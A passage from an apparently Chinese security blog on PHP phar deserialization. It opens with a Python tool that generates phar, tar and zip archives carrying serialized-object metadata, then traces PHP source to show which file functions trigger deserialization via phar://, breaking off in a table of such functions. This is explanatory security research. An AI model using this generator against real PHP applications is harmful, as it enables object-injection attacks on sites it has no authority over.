class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time, localtime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha1, sha256, sha512</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> gzip <span class="keyword">import</span> compress <span class="keyword">as</span> gz_compress</span><br><span class="line"><span class="keyword">from</span> bz2 <span class="keyword">import</span> compress <span class="keyword">as</span> bz2_compress</span><br><span class="line"><span class="keyword">from</span> tarfile <span class="keyword">import</span> <span class="built_in">open</span> <span class="keyword">as</span> tar_open, TarInfo</span><br><span class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZipFile <span class="keyword">as</span> zip_open, ZipInfo, ZIP_DEFLATED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHAR</span>:</span></span><br><span class="line">    <span class="comment"># 类型</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TYPE</span>:</span></span><br><span class="line"></span><br><span class="line">        MD5 = <span class="string">b&quot;\x01\x00\x00\x00&quot;</span></span><br><span class="line">        SHA1 = <span class="string">b&quot;\x02\x00\x00\x00&quot;</span></span><br><span class="line">        SHA256 = <span class="string">b&quot;\x03\x00\x00\x00&quot;</span></span><br><span class="line">        SHA512 = <span class="string">b&quot;\x04\x00\x00\x00&quot;</span></span><br><span class="line">        DEFAULT = <span class="number">0x00</span></span><br><span class="line">        GZ = <span class="number">0x01</span></span><br><span class="line">        BZ2 = <span class="number">0x02</span></span><br><span class="line">        TAR = <span class="number">0x03</span></span><br><span class="line">        ZIP = <span class="number">0x04</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 一些常量</span></span><br><span class="line">    STUB = <span class="string">b&quot;__HALT_COMPILER(); ?&gt;&quot;</span></span><br><span class="line">    GBMB = <span class="string">b&quot;GBMB&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,</span></span></span><br><span class="line"><span class="params"><span class="function">                 prefix: <span class="built_in">str</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 suffix: <span class="built_in">str</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 manifestData: <span class="built_in">dict</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 filesData: <span class="built_in">list</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 signatureType=TYPE.MD5,</span></span></span><br><span class="line"><span class="params"><span class="function">                 formatType=TYPE.DEFAULT</span></span></span><br><span class="line"><span class="params"><span class="function">                 </span>):</span></span><br><span class="line">        self.prefix = prefix.encode()</span><br><span class="line">        self.suffix = suffix.encode()</span><br><span class="line">        self.manifestData = manifestData</span><br><span class="line">        self.filesData = filesData</span><br><span class="line">        self.signatureType = signatureType</span><br><span class="line">        self.formatType = formatType</span><br><span class="line">        self.time = <span class="built_in">int</span>(time())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查签名类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(self.signatureType != each <span class="keyword">for</span> each <span class="keyword">in</span> [self.TYPE.MD5, self.TYPE.SHA1, self.TYPE.SHA256,</span><br><span class="line">                                                       self.TYPE.SHA512]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 检查格式类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(self.formatType != each <span class="keyword">for</span> each <span class="keyword">in</span> [self.TYPE.DEFAULT, self.TYPE.GZ, self.TYPE.BZ2, self.TYPE.TAR,</span><br><span class="line">                                                    self.TYPE.ZIP]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 检查清单的参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(self.manifestData.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 至少要归档一个文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.filesData) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 遍历检查文件的参数</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字符串转换字节流</span></span><br><span class="line">        self.manifestData[<span class="string">&quot;metaData&quot;</span>] = self.manifestData[<span class="string">&quot;metaData&quot;</span>].encode()</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> file.items():</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;metaData&quot;</span>]:</span><br><span class="line">                    file[key] = value.encode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.parse():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断生成的格式</span></span><br><span class="line">        <span class="keyword">if</span> self.formatType <span class="keyword">in</span> [self.TYPE.DEFAULT, self.TYPE.GZ, self.TYPE.BZ2]:</span><br><span class="line">            <span class="comment"># stub</span></span><br><span class="line">            stub = self.stub()</span><br><span class="line">            <span class="comment"># manifest</span></span><br><span class="line">            manifest = self.manifest()</span><br><span class="line">            files = self.file()</span><br><span class="line">            <span class="comment"># content</span></span><br><span class="line">            contents = self.content()</span><br><span class="line">            <span class="comment"># 计算总长度</span></span><br><span class="line">            manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(manifest + files + contents)) + manifest[<span class="number">4</span>:]</span><br><span class="line">            <span class="comment"># signature</span></span><br><span class="line">            signature = self.signature(stub + manifest + files + contents)</span><br><span class="line">            <span class="comment"># 拼接</span></span><br><span class="line">            phar = stub + manifest + files + contents + signature</span><br><span class="line">            <span class="comment"># 默认phar归档格式</span></span><br><span class="line">            <span class="keyword">if</span> self.formatType == self.TYPE.DEFAULT:</span><br><span class="line">                <span class="keyword">return</span> phar</span><br><span class="line">            <span class="comment"># gz压缩(如果有后缀则添上后缀)</span></span><br><span class="line">            <span class="keyword">if</span> self.formatType == self.TYPE.GZ:</span><br><span class="line">                <span class="keyword">return</span> self.gz(phar) + self.suffix</span><br><span class="line">            <span class="comment"># bz2压缩</span></span><br><span class="line">            <span class="keyword">if</span> self.formatType == self.TYPE.BZ2:</span><br><span class="line">                <span class="keyword">return</span> self.bz2(phar)</span><br><span class="line">        <span class="comment"># 若为tar打包</span></span><br><span class="line">        <span class="keyword">if</span> self.formatType == self.TYPE.TAR:</span><br><span class="line">            <span class="keyword">return</span> self.tar()</span><br><span class="line">        <span class="comment"># 若为zip压缩</span></span><br><span class="line">        <span class="keyword">if</span> self.formatType == self.TYPE.ZIP:</span><br><span class="line">            <span class="keyword">return</span> self.<span class="built_in">zip</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gz</span>(<span class="params">content</span>):</span></span><br><span class="line">        <span class="keyword">return</span> gz_compress(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bz2</span>(<span class="params">content</span>):</span></span><br><span class="line">        <span class="keyword">return</span> bz2_compress(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tar</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        out = BytesIO()</span><br><span class="line">        tar = tar_open(mode=<span class="string">&quot;w&quot;</span>, fileobj=out)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果有前缀且前缀是合法文件名</span></span><br><span class="line">        <span class="keyword">if</span> self.prefix <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">any</span>(each <span class="keyword">in</span> self.prefix <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">list</span>(<span class="string">&#x27;\/;*?&quot;&lt;&gt;|&#x27;</span>)):</span><br><span class="line">            info = TarInfo(self.prefix.decode())</span><br><span class="line">            info.mode = <span class="number">0o000</span></span><br><span class="line">            tar.addfile(info, BytesIO(<span class="string">b&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 先打包归档文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            info = TarInfo(file[<span class="string">&quot;fileName&quot;</span>].decode())</span><br><span class="line">            info.size = <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>])</span><br><span class="line">            info.mtime = self.time</span><br><span class="line">            info.mode = <span class="number">0o666</span></span><br><span class="line">            read = BytesIO(file[<span class="string">&quot;fileContent&quot;</span>])</span><br><span class="line">            tar.addfile(info, read)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打包manifest.metadata</span></span><br><span class="line">        <span class="keyword">if</span> self.manifestData[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">            info = TarInfo(<span class="string">&quot;.phar/.metadata.bin&quot;</span>)</span><br><span class="line">            info.size = <span class="built_in">len</span>(self.manifestData[<span class="string">&quot;metaData&quot;</span>])</span><br><span class="line">            info.mtime = self.time</span><br><span class="line">            info.mode = <span class="number">0o000</span></span><br><span class="line">            read = BytesIO(self.manifestData[<span class="string">&quot;metaData&quot;</span>])</span><br><span class="line">            tar.addfile(info, read)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打包file.metadata</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">if</span> file[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">                info = TarInfo(<span class="string">f&quot;.phar/.metadata/<span class="subst">&#123;file[<span class="string">&#x27;fileName&#x27;</span>].decode()&#125;</span>/.metadata.bin&quot;</span>)</span><br><span class="line">                info.size = <span class="built_in">len</span>(file[<span class="string">&quot;metaData&quot;</span>])</span><br><span class="line">                info.mtime = self.time</span><br><span class="line">                info.mode = <span class="number">0o000</span></span><br><span class="line">                read = BytesIO(file[<span class="string">&quot;metaData&quot;</span>])</span><br><span class="line">                tar.addfile(info, read)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打包完毕</span></span><br><span class="line">        tar.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果有后缀</span></span><br><span class="line">        <span class="keyword">return</span> out.getvalue() + self.suffix</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zip</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        out = BytesIO()</span><br><span class="line">        fzip = zip_open(file=out, mode=<span class="string">&quot;w&quot;</span>, compression=ZIP_DEFLATED, compresslevel=<span class="number">9</span>)</span><br><span class="line">        timeFormat = localtime(self.time)</span><br><span class="line">        timeTuple = (</span><br><span class="line">            timeFormat.tm_year, timeFormat.tm_mon, timeFormat.tm_mday, timeFormat.tm_hour, timeFormat.tm_min, timeFormat.tm_sec)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打包归档文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            info = ZipInfo(file[<span class="string">&quot;fileName&quot;</span>].decode(), timeTuple)</span><br><span class="line">            <span class="comment"># 文件写入metadata内容</span></span><br><span class="line">            <span class="keyword">if</span> file[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">                info.comment = file[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">            fzip.writestr(info, file[<span class="string">&quot;fileContent&quot;</span>], compress_type=ZIP_DEFLATED, compresslevel=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 压缩包写入metadata内容</span></span><br><span class="line">        <span class="keyword">if</span> self.manifestData[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">            fzip.comment = self.manifestData[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果有后缀</span></span><br><span class="line">        fzip.comment += self.suffix</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 压缩完毕</span></span><br><span class="line">        fzip.close()</span><br><span class="line">        <span class="keyword">return</span> out.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stub</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.prefix + self.STUB + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">manifest</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 归档文件数量</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.filesData))</span><br><span class="line">        <span class="comment"># 版本</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x11\x00&quot;</span></span><br><span class="line">        <span class="comment"># 标识</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x01\x00&quot;</span></span><br><span class="line">        <span class="comment"># 别名长度</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">        <span class="keyword">if</span> self.manifestData[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">            <span class="comment"># metadata长度</span></span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.manifestData[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">            <span class="comment"># metadata内容</span></span><br><span class="line">            manifest += self.manifestData[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 补足长度</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>) + manifest</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> manifest</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        files = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历归档的文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="comment"># 文件名长度</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileName&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件名</span></span><br><span class="line">            files += file[<span class="string">&quot;fileName&quot;</span>]</span><br><span class="line">            <span class="comment"># 未压缩大小</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 时间戳</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, self.time)</span><br><span class="line">            <span class="comment"># 压缩后大小</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># CRC32校验</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, crc32(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件权限</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0o666</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">            <span class="keyword">if</span> file[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">                <span class="comment"># metadata长度</span></span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">                <span class="comment"># metadata内容</span></span><br><span class="line">                files += file[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">content</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        contents = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历所有归档文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            contents += file[<span class="string">&quot;fileContent&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> contents</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signature</span>(<span class="params">self, content</span>):</span></span><br><span class="line"></span><br><span class="line">        signature = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 签名内容</span></span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.TYPE.MD5:</span><br><span class="line">            signature = md5(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.TYPE.SHA1:</span><br><span class="line">            signature = sha1(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.TYPE.SHA256:</span><br><span class="line">            signature = sha256(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.TYPE.SHA512:</span><br><span class="line">            signature = sha512(content).digest()</span><br><span class="line">        <span class="comment"># 签名标志</span></span><br><span class="line">        signature += self.signatureType</span><br><span class="line">        <span class="comment"># GBMB标志</span></span><br><span class="line">        signature += self.GBMB</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pharData = &#123;</span><br><span class="line">        <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;321&quot;</span>,</span><br><span class="line">        <span class="string">&quot;manifestData&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;filesData&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;e.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;dsadawada&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;c.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;signatureType&quot;</span>: PHAR.TYPE.SHA1,</span><br><span class="line">        <span class="string">&quot;formatType&quot;</span>: PHAR.TYPE.TAR</span><br><span class="line">    &#125;</span><br><span class="line">    p = PHAR(**pharData).generate()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="影响函数">- 影响函数 -</h2>
<p>说到影响函数，第一时间能想到的应该就是有关文件操作的函数了，至于为什么这些函数能够触发 <code>phar</code> 的 <code>反序列化</code> ，说到底还是能够调用 <code>phar</code> 协议去解析 <code>phar</code> 文件罢。那么不妨对整个 <code>phar</code> 协议的调用过程做一个分析。</p>
<h3 id="分析-2">- 分析 -</h3>
<p>首先来看一下 <code>phar</code> 协议，它是通过 <code>Stream Wrapper</code>(流包装器) 实现的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261335073.png" alt="image-20220126133513990"></p>
<p>因此在调用 <code>stream_get_wrappers</code> 函数时，可以看到 <code>phar</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261336372.png" alt="image-20220126133646589"></p>
<p>跟进 <code>stream_get_wrappers</code> 函数的源码👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261338198.png" alt="image-20220126133822102"></p>
<p>可以看到先是从 <code>php_stream_get_url_stream_wrappers_hash</code> 函数获取有关 <code>Stream Wrapper</code> 哈希表内容后，将遍历内容中的流协议名组成一个数组返回。那么继续跟进 <code>php_stream_get_url_stream_wrappers_hash</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261339183.png" alt="image-20220126133959138"></p>
<p>返回的是有关 <code>Stream Wrapper</code> 信息的内容，记住这个获取的过程。</p>
<p>接着看能够调用 <code>phar</code> 协议去解析文件的函数，比如 <code>readfile</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261351247.png" alt="image-20220126135132132"></p>
<p>这里是调用了 <code>php_stream_open_wrapper_ex</code> 获取流，然后将流内容输出出来，其中 <code>filename</code> 这个传入的参数的值即是包含 <code>phar://</code> 内容。</p>
<p>那么全局搜索 <code>php_stream_open_wrapper_ex</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261354699.png" alt="image-20220126135458653"></p>
<p>可以得到 <code>php_stream_open_wrapper_ex</code> 函数的原型是 <code>_php_stream_open_wrapper_ex</code> 函数。如果继续全局搜索 <code>_php_stream_open_wrapper_ex</code> 函数，可以发现以下函数的原型都是 <code>_php_stream_open_wrapper_ex</code> 函数👇</p>
<ul>
<li>
<p><code>php_stream_open_wrapper</code></p>
</li>
<li>
<p><code>php_stream_open_wrapper_ex</code></p>
</li>
<li>
<p><code>php_stream_open_wrapper_rel</code></p>
</li>
<li>
<p><code>php_stream_open_wrapper_ex_rel</code></p>
</li>
</ul>
<p>这里跟进 <code>_php_stream_open_wrapper_ex</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261415466.png" alt="image-20220126141544337"></p>
<p>可以看到是先通过 <code>php_stream_locate_url_wrapper</code> 函数获取 <code>流包装器</code> 内容，然后通过 <code>流包装器</code> 去初始化 <code>流</code> 内容。其中在调用 <code>php_stream_locate_url_wrapper</code> 函数过程中的 <code>path</code> 参数包含 <code>phar://</code> 内容。</p>
<p>跟进 <code>php_stream_locate_url_wrapper</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261420164.png" alt="image-20220126142032041"></p>
<p>其中第一行语句 <code>HashTable *wrapper_hash = (FG(stream_wrappers) ? FG(stream_wrappers) : &amp;url_stream_wrappers_hash);</code> 显然和上面获取有关 <code>Stream Wrapper</code> 信息的内容是一致的，而继续往下看这两个条件是获取 <code>协议头部</code> 内容，然后通过从 <code>Stream Wrapper</code> 信息内容中找到符合 <code>协议头部</code> 的 <code>流包装器</code> ，并返回。</p>
<p>因此 <code>_php_stream_open_wrapper_ex</code> 函数的作用即是通过解析传入的路径的 <code>协议头部</code> 找到相关的 <code>流包装器</code> ，再从 <code>流包装器</code> 去初始化 <code>流</code> ，最后返回得到 <code>流</code> 的内容。</p>
<p>那么不妨更深一层来看，在源码的 <code>phar</code> 扩展目录中 <code>stream.c</code> 文件里的 <code>phar_parse_url</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261531425.png" alt="image-20220126153132286"></p>
<p>这里只要操作模式不为<code>a*</code> 、  <code>w*</code>  或是  <code>r+</code> 就有机会调用 <code>phar_open_from_filename</code> 函数，再跟进 <code>phar_open_from_filename</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261532128.png" alt="image-20220126153241982"></p>
<p>可以发现在 <code>phar_open_from_filename</code> 函数中又有机会调用 <code>phar_open_from_fp</code> 函数，而 <code>phar_open_from_fp</code> 函数实际上就是在上面所说的用来解析 <code>phar</code> 文件内容的函数，也就有机会从以下函数👇</p>
<ul>
<li><code>phar_parse_pharfile</code></li>
<li><code>phar_parse_tarfile</code></li>
<li><code>phar_parse_zipfile</code></li>
</ul>
<p>最终调用至 <code>phar_parse_metadata</code> 函数进行 <code>反序列化</code> 。</p>
<p>那么，全局搜索源码的 <code>phar</code> 扩展目录，其中有以下函数会调用 <code>phar_parse_url</code> 函数且有机会符合操作模式条件👇</p>
<ul>
<li><code>phar_wrapper_open_url</code></li>
<li><code>phar_wrapper_stat</code></li>
<li><code>phar_wrapper_unlink</code></li>
<li><code>phar_wrapper_rename</code></li>
<li><code>phar_wrapper_open_dir</code></li>
</ul>
<p>再来看有关 <code>phar</code> 的 <code>流包装器</code> 的方法包装👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261543728.png" alt="image-20220126154309642"></p>
<p>是存在上面列出的函数的，那么也就是说如果从源码的角度来看，只要能满足以下步骤就有可能可以用 <code>phar://</code> 去触发 <code>反序列化</code> 👇</p>
<ul>
<li><code>调用_php_stream_open_wrapper_ex函数，并操作返回的结果</code></li>
<li><code>调用php_stream_locate_url_wrapper函数，并将返回结果做以下操作</code>
<ul>
<li><code>wrapper-&gt;wops-&gt;stream_opener()</code></li>
<li><code>wrapper-&gt;wops-&gt;stat_url()</code></li>
<li><code>wrapper-&gt;wops-&gt;dir_opener()</code></li>
<li><code>wrapper-&gt;wops-&gt;unlink()</code></li>
<li><code>wrapper-&gt;wops-&gt;rename()</code></li>
<li><code>......</code></li>
</ul>
</li>
</ul>
<p>最简单的例子，比如 <code>rename</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261602465.png" alt="image-20220126160255343"></p>
<p>是调用了 <code>wrapper-&gt;wops-&gt;rename()</code> ，实际上确实可以(这里我归档了 <code>3</code> 个文件)👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201261604624.png" alt="image-20220126160439561"></p>
<p>当然，其他的像 <code>fopen</code> ， <code>stat</code> ， <code>opendir</code> ， <code>mkdir</code> ， <code>rmdir</code>  也是可以触发 <code>反序列化</code> 的，所以以上只是判断方法之一罢。</p>
<h3 id="结论">- 结论 -</h3>
<p>由此，简单总结出一些常用的可以通过直接或间接调用 <code>phar</code> 协议来进行 <code>反序列化</code> 的函数/语法👇</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">bzopen</td>
<td style="text-align:center">copy</td>
<td style="text-align:center">dba_open</td>
<td style="text-align:center">dba_popen</td>
<td style="text-align:center">dir</td>
</tr>
<tr>
